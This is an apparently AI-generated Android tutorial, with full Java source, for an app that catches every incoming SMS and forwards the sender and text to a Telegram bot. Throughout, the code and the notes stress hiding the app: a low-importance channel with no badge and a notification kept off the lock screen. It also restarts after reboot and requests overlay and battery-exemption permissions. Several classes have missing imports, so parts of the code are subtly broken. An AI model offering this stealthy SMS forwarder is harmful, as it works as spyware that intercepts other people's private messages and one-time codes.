# SMS Forwarder App

## Project Setup

First, let's set up the project structure and dependencies.

### 1. Create a new Android project

In Android Studio:
- File → New → New Project
- Select "Empty Activity"
- Name: "SmsForwarder"
- Package name: com.example.smsforwarder
- Language: Java
- Minimum SDK: API 21 (Android 5.0)

### 2. Update build.gradle (Module: app)

```gradle
apply plugin: 'com.android.application'

android {
    compileSdkVersion 33
    defaultConfig {
        applicationId "com.example.smsforwarder"
        minSdkVersion 21
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation fileTree(dir: 'libs', include: ['*.jar'])
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'com.google.android.material:material:1.9.0'
    
    // For network requests
    implementation 'com.squareup.okhttp3:okhttp:4.9.3'
    
    // For handling runtime permissions
    implementation 'pub.devrel:easypermissions:3.0.0'
    
    // WorkManager for background tasks
    implementation 'androidx.work:work-runtime:2.8.1'
    
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}
```

### 3. Update AndroidManifest.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.example.smsforwarder">

    <!-- Internet permission for Telegram API -->
    <uses-permission android:name="android.permission.INTERNET" />
    <!-- SMS permission -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <!-- Boot completed permission -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <!-- Foreground service permission -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <!-- Post notifications permission for Android 13+ -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <!-- Ignore battery optimizations -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <!-- For Android 10+ to start activity from background -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <application
        android:name=".AppController"
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"
        tools:ignore="GoogleAppIndexingWarning">
        
        <!-- Main Activity -->
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- SMS Receiver -->
        <receiver
            android:name=".receiver.SmsReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- Boot Completed Receiver -->
        <receiver
            android:name=".receiver.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- Foreground Service -->
        <service
            android:name=".service.SmsForwarderService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="shortService" />

        <!-- WorkManager for periodic tasks -->
        <provider
            android:name="androidx.work.impl.WorkManagerInitializer"
            android:authorities="${applicationId}.workmanager-init"
            android:exported="false"
            tools:node="remove" />
    </application>
</manifest>
```

## Implementation Files

### 1. AppController.java (Application Class)

```java
package com.example.smsforwarder;

import android.app.Application;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;

public class AppController extends Application {
    public static final String CHANNEL_ID = "SmsForwarderServiceChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "SMS Forwarder Service Channel",
                    NotificationManager.IMPORTANCE_LOW // Set to LOW to minimize visibility
            );
            serviceChannel.setDescription("Channel for SMS Forwarder service");
            serviceChannel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }
}
```

### 2. MainActivity.java

```java
package com.example.smsforwarder;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.example.smsforwarder.service.SmsForwarderService;
import com.example.smsforwarder.utils.Preferences;

public class MainActivity extends AppCompatActivity {
    private EditText etBotToken, etChatId;
    private Button btnSave, btnStartService;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etBotToken = findViewById(R.id.etBotToken);
        etChatId = findViewById(R.id.etChatId);
        btnSave = findViewById(R.id.btnSave);
        btnStartService = findViewById(R.id.btnStartService);

        // Load saved preferences
        Preferences preferences = new Preferences(this);
        etBotToken.setText(preferences.getBotToken());
        etChatId.setText(preferences.getChatId());

        btnSave.setOnClickListener(v -> saveSettings());
        btnStartService.setOnClickListener(v -> startForwardingService());

        // Check and request necessary permissions
        checkPermissions();
    }

    private void saveSettings() {
        String botToken = etBotToken.getText().toString().trim();
        String chatId = etChatId.getText().toString().trim();

        if (botToken.isEmpty() || chatId.isEmpty()) {
            Toast.makeText(this, "Please enter both Bot Token and Chat ID", Toast.LENGTH_SHORT).show();
            return;
        }

        Preferences preferences = new Preferences(this);
        preferences.setBotToken(botToken);
        preferences.setChatId(chatId);

        Toast.makeText(this, "Settings saved!", Toast.LENGTH_SHORT).show();
    }

    private void startForwardingService() {
        Preferences preferences = new Preferences(this);
        if (preferences.getBotToken().isEmpty() || preferences.getChatId().isEmpty()) {
            Toast.makeText(this, "Please save valid Bot Token and Chat ID first", Toast.LENGTH_SHORT).show();
            return;
        }

        // Start the foreground service
        Intent serviceIntent = new Intent(this, SmsForwarderService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Request to ignore battery optimization
        requestIgnoreBatteryOptimization();

        Toast.makeText(this, "SMS Forwarding service started", Toast.LENGTH_SHORT).show();
    }

    private void checkPermissions() {
        // Check SMS permissions
        if (!PermissionsHelper.hasSmsPermissions(this)) {
            PermissionsHelper.requestSmsPermissions(this);
        }

        // Check notification permission for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!PermissionsHelper.hasNotificationPermission(this)) {
                PermissionsHelper.requestNotificationPermission(this);
            }
        }

        // Check overlay permission for Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            PermissionsHelper.requestOverlayPermission(this);
        }
    }

    private void requestIgnoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(android.net.Uri.parse("package:" + packageName));
            startActivity(intent);
        }
    }
}
```

### 3. activity_main.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp"
    tools:context=".MainActivity">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Telegram Bot Settings"
        android:textSize="18sp"
        android:textStyle="bold"
        android:layout_marginBottom="16dp"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Bot Token:"/>

    <EditText
        android:id="@+id/etBotToken"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Enter your Telegram bot token"
        android:inputType="text"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Chat ID:"
        android:layout_marginTop="16dp"/>

    <EditText
        android:id="@+id/etChatId"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Enter your Telegram chat ID"
        android:inputType="text"/>

    <Button
        android:id="@+id/btnSave"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Save Settings"
        android:layout_marginTop="24dp"/>

    <Button
        android:id="@+id/btnStartService"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Start SMS Forwarding"
        android:layout_marginTop="16dp"/>
</LinearLayout>
```

### 4. SmsForwarderService.java (Foreground Service)

```java
package com.example.smsforwarder.service;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.smsforwarder.MainActivity;
import com.example.smsforwarder.R;
import com.example.smsforwarder.utils.Preferences;

public class SmsForwarderService extends Service {
    private static final String TAG = "SmsForwarderService";
    private static final int NOTIFICATION_ID = 101;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        // Create notification (required for foreground service)
        createNotification();

        // Make sure the service keeps running
        return START_STICKY;
    }

    private void createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                PendingIntent.FLAG_IMMUTABLE
        );

        Notification notification = new NotificationCompat.Builder(this, AppController.CHANNEL_ID)
                .setContentTitle("SMS Forwarder")
                .setContentText("Forwarding SMS to Telegram")
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setAutoCancel(false)
                .setShowWhen(false)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide from lock screen
                .build();

        // Start foreground service with the notification
        startForeground(NOTIFICATION_ID, notification);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
    }
}
```

### 5. SmsReceiver.java (Broadcast Receiver)

```java
package com.example.smsforwarder.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.example.smsforwarder.service.SmsForwarderService;
import com.example.smsforwarder.utils.Preferences;
import com.example.smsforwarder.utils.TelegramHelper;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "SMS received");
        
        // Get the SMS message
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String message = smsMessage.getMessageBody();
                    
                    Log.d(TAG, "From: " + sender + ", Message: " + message);
                    
                    // Forward to Telegram
                    forwardToTelegram(context, sender, message);
                }
            }
        }
    }

    private void forwardToTelegram(Context context, String sender, String message) {
        Preferences preferences = new Preferences(context);
        String botToken = preferences.getBotToken();
        String chatId = preferences.getChatId();
        
        if (botToken.isEmpty() || chatId.isEmpty()) {
            Log.e(TAG, "Bot token or chat ID not set");
            return;
        }
        
        String telegramMessage = "New SMS from " + sender + ":\n" + message;
        
        // Send to Telegram in background
        TelegramHelper.sendMessage(botToken, chatId, telegramMessage, new TelegramHelper.TelegramCallback() {
            @Override
            public void onSuccess() {
                Log.d(TAG, "Message forwarded to Telegram");
            }

            @Override
            public void onFailure(String error) {
                Log.e(TAG, "Failed to forward message: " + error);
            }
        });
    }
}
```

### 6. BootReceiver.java (Boot Completed Receiver)

```java
package com.example.smsforwarder.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.example.smsforwarder.service.SmsForwarderService;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "Boot completed, starting service");
            
            // Start the foreground service
            Intent serviceIntent = new Intent(context, SmsForwarderService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
```

### 7. TelegramHelper.java (Telegram API Helper)

```java
package com.example.smsforwarder.utils;

import android.util.Log;

import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TelegramHelper {
    private static final String TAG = "TelegramHelper";
    private static final String TELEGRAM_API_URL = "https://api.telegram.org/bot%s/sendMessage";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    public interface TelegramCallback {
        void onSuccess();
        void onFailure(String error);
    }

    public static void sendMessage(String botToken, String chatId, String message, TelegramCallback callback) {
        OkHttpClient client = new OkHttpClient();
        
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", chatId);
            json.put("text", message);
            
            RequestBody body = RequestBody.create(json.toString(), JSON);
            String url = String.format(TELEGRAM_API_URL, botToken);
            
            Request request = new Request.Builder()
                    .url(url)
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to send message: " + e.getMessage());
                    callback.onFailure(e.getMessage());
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        callback.onSuccess();
                    } else {
                        String error = response.body() != null ? response.body().string() : "Unknown error";
                        Log.e(TAG, "Failed to send message: " + error);
                        callback.onFailure(error);
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error creating request: " + e.getMessage());
            callback.onFailure(e.getMessage());
        }
    }
}
```

### 8. Preferences.java (SharedPreferences Helper)

```java
package com.example.smsforwarder.utils;

import android.content.Context;
import android.content.SharedPreferences;

public class Preferences {
    private static final String PREF_NAME = "SmsForwarderPrefs";
    private static final String KEY_BOT_TOKEN = "bot_token";
    private static final String KEY_CHAT_ID = "chat_id";

    private final SharedPreferences sharedPreferences;

    public Preferences(Context context) {
        sharedPreferences = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
    }

    public String getBotToken() {
        return sharedPreferences.getString(KEY_BOT_TOKEN, "");
    }

    public void setBotToken(String botToken) {
        sharedPreferences.edit().putString(KEY_BOT_TOKEN, botToken).apply();
    }

    public String getChatId() {
        return sharedPreferences.getString(KEY_CHAT_ID, "");
    }

    public void setChatId(String chatId) {
        sharedPreferences.edit().putString(KEY_CHAT_ID, chatId).apply();
    }
}
```

### 9. PermissionsHelper.java

```java
package com.example.smsforwarder.utils;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class PermissionsHelper {
    public static final int SMS_PERMISSION_REQUEST_CODE = 100;
    public static final int NOTIFICATION_PERMISSION_REQUEST_CODE = 101;
    public static final int OVERLAY_PERMISSION_REQUEST_CODE = 102;

    public static boolean hasSmsPermissions(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    public static void requestSmsPermissions(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.READ_SMS
                },
                SMS_PERMISSION_REQUEST_CODE);
    }

    public static boolean hasNotificationPermission(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    public static void requestNotificationPermission(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(activity,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    NOTIFICATION_PERMISSION_REQUEST_CODE);
        }
    }

    public static boolean hasOverlayPermission(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(context);
        }
        return true;
    }

    public static void requestOverlayPermission(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + activity.getPackageName()));
            activity.startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
        }
    }
}
```

## Additional Resources

### 1. ic_notification.xml (in res/drawable)

Create a simple notification icon. You can use Android Studio's Vector Asset Studio to create one.

### 2. strings.xml

```xml
<resources>
    <string name="app_name">SMS Forwarder</string>
</resources>
```

## Important Notes

1. **Telegram Bot Setup**:
   - You need to create a Telegram bot using BotFather and get the bot token
   - Get your chat ID by sending a message to your bot and checking the updates at `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`

2. **Battery Optimization**:
   - The app requests to be excluded from battery optimization, but users need to manually confirm this in settings

3. **Background Operation**:
   - The app uses a foreground service to ensure it keeps running in the background
   - It also listens for boot completed events to auto-start after device reboot

4. **Notification Handling**:
   - Notifications are set to minimal visibility (VISIBILITY_SECRET and IMPORTANCE_LOW)
   - The notification channel is created with showBadge=false to minimize appearance

5. **Permissions**:
   - The app requests all necessary permissions at runtime
   - For Android 10+, it requests overlay permission to start activities from background

6. **AndroidX Compatibility**:
   - The project is fully compatible with AndroidX libraries

To use this app:
1. Enter your Telegram bot token and chat ID in the settings
2. Click "Save Settings"
3. Click "Start SMS Forwarding"
4. Grant all requested permissions
5. The app will now forward all incoming SMS to your Telegram bot

The app will continue running in the background and survive device reboots. All notifications from the app are minimized or hidden while still maintaining functionality.




Here's the complete project structure for  SMS Forwarder Android app:

```
SmsForwarder/
├── app/
│   ├── src/
│   │   ├── main/
│   │   │   ├── java/com/example/smsforwarder/
│   │   │   │   ├── AppController.java
│   │   │   │   ├── MainActivity.java
│   │   │   │   ├── receiver/
│   │   │   │   │   ├── BootReceiver.java
│   │   │   │   │   └── SmsReceiver.java
│   │   │   │   ├── service/
│   │   │   │   │   └── SmsForwarderService.java
│   │   │   │   └── utils/
│   │   │   │       ├── PermissionsHelper.java
│   │   │   │       ├── Preferences.java
│   │   │   │       └── TelegramHelper.java
│   │   │   ├── res/
│   │   │   │   ├── drawable/
│   │   │   │   │   └── ic_notification.xml
│   │   │   │   ├── layout/
│   │   │   │   │   └── activity_main.xml
│   │   │   │   ├── mipmap/ (various density icons)
│   │   │   │   ├── values/
│   │   │   │   │   ├── colors.xml
│   │   │   │   │   ├── strings.xml
│   │   │   │   │   └── styles.xml
│   │   │   │   └── AndroidManifest.xml
│   │   │   └── assets/
│   │   └── test/ (unit tests)
│   ├── build.gradle (Module: app)
│   └── proguard-rules.pro
├── gradle/
│   └── wrapper/
│       ├── gradle-wrapper.jar
│       └── gradle-wrapper.properties
├── build.gradle (Project: SmsForwarder)
├── settings.gradle
├── gradlew
├── gradlew.bat
└── gradle.properties
```

### Detailed Explanation:

1. **AppController.java**:
   - Application class that initializes app-wide components
   - Creates the notification channel for foreground service

2. **MainActivity.java**:
   - Main UI for entering Telegram bot settings
   - Handles permission requests
   - Starts the foreground service

3. **Receiver Package**:
   - `BootReceiver.java`: Starts service on device boot
   - `SmsReceiver.java`: Listens for incoming SMS and forwards them

4. **Service Package**:
   - `SmsForwarderService.java`: Foreground service that keeps the app running

5. **Utils Package**:
   - `PermissionsHelper.java`: Manages runtime permissions
   - `Preferences.java`: Handles SharedPreferences for settings
   - `TelegramHelper.java`: Handles Telegram API communication

6. **Resources**:
   - `ic_notification.xml`: Notification icon
   - `activity_main.xml`: Layout for main screen
   - Standard resource files (strings, colors, styles)

7. **Gradle Files**:
   - Module-level build.gradle contains all dependencies
   - Project-level build.gradle has project-wide configs

8. **AndroidManifest.xml**:
   - Declares all components and permissions
   - Registers receivers and services

### Key Features Implemented:

1. **Background Operation**:
   - Foreground service with low-priority notification
   - Boot receiver for auto-start

2. **Telegram Integration**:
   - OkHttp for API calls
   - Async message forwarding

3. **Permission Handling**:
   - Runtime permissions for SMS, notifications, overlay
   - Battery optimization exemption

4. **Data Persistence**:
   - SharedPreferences for bot settings

5. **AndroidX Compatibility**:
   - All modern AndroidX libraries used
   - Target SDK 33 (Android 13)

This structure follows Android best practices with proper separation of concerns and modular organization. All components are properly declared in the manifest and wired together through intents and shared preferences.
